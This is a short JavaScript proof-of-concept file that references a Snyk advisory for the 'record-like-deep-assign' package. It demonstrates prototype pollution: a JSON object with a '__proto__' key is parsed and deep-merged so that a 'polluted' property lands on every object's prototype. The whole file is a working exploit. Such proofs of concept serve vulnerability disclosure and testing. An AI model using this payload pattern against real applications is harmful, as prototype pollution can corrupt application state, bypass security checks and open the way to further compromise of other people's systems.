//https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024
 
  const deepAssign = require("record-like-deep-assign");

   

  let obj = {};
  EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  deepAssign({}, EVIL_JSON);
// End of file
